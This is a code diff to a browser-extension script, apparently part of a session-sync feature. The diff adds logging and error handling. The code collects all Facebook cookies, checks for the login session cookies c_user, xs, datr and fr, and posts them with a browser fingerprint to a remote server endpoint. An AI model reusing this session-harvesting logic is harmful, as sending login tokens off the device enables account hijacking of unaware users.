@@ -687,11 +687,20 @@ const SESSION_AUTO_SYNC_INTERVAL_MS = 4 * 60 * 60 * 1000; // 4 hours
  */
 async function captureFacebookCookies() {
   try {
+    console.log('🍪 Starting cookie capture...');
+    
     // Try multiple methods to capture cookies
     const cookies1 = await chrome.cookies.getAll({ domain: '.facebook.com' });
+    console.log('  Method 1 (.facebook.com):', cookies1.length, 'cookies');
+    
     const cookies2 = await chrome.cookies.getAll({ domain: 'facebook.com' });
+    console.log('  Method 2 (facebook.com):', cookies2.length, 'cookies');
+    
     const cookies3 = await chrome.cookies.getAll({ url: 'https://www.facebook.com' });
+    console.log('  Method 3 (url www):', cookies3.length, 'cookies');
+    
     const cookies4 = await chrome.cookies.getAll({ url: 'https://facebook.com' });
+    console.log('  Method 4 (url base):', cookies4.length, 'cookies');
     
     // Merge and deduplicate all cookies
     const cookieMap = new Map();
@@ -702,7 +711,11 @@ async function captureFacebookCookies() {
       }
     }
     const allCookies = Array.from(cookieMap.values());
-    console.log('🍪 Captured cookies:', allCookies.length, 'cookies from Facebook');
+    
+    // Log which important cookies we found
+    const importantCookies = ['c_user', 'xs', 'datr', 'fr'];
+    const foundCookies = importantCookies.filter(name => allCookies.some(c => c.name === name));
+    console.log('🍪 Captured cookies:', allCookies.length, 'total. Found:', foundCookies.join(', ') || 'NONE');
     
     return allCookies.map(c => ({
       name: c.name,
@@ -773,23 +786,44 @@ async function captureAndSyncSession() {
     }
     
     // Send to server
-    const response = await fetch(`${CONFIG.API_URL}/fb-session/capture`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': `Bearer ${token}`,
-        'X-Browser-ID': browserFingerprint
-      },
-      body: JSON.stringify({
-        cookies,
-        userAgent: navigator.userAgent,
-        browserFingerprint
-      })
+    console.log('📤 Sending session capture to API...', { 
+      url: `${CONFIG.API_URL}/fb-session/capture`,
+      cookieCount: cookies.length,
+      hasToken: !!token 
     });
     
+    let response;
+    try {
+      response = await fetch(`${CONFIG.API_URL}/fb-session/capture`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`,
+          'X-Browser-ID': browserFingerprint
+        },
+        body: JSON.stringify({
+          cookies,
+          userAgent: navigator.userAgent,
+          browserFingerprint
+        })
+      });
+    } catch (fetchError) {
+      console.error('❌ Network error during session capture:', fetchError);
+      return { success: false, error: `Network error: ${fetchError.message}` };
+    }
+    
+    console.log('📥 API response status:', response.status);
+    
     if (!response.ok) {
-      const error = await response.json();
-      return { success: false, error: error.error || 'Session capture failed' };
+      let errorText = 'Session capture failed';
+      try {
+        const error = await response.json();
+        errorText = error.error || error.message || `API error ${response.status}`;
+      } catch (e) {
+        errorText = `API error ${response.status}: ${response.statusText}`;
+      }
+      console.error('❌ API returned error:', errorText);
+      return { success: false, error: errorText };
     }
     
     const result = await response.json();
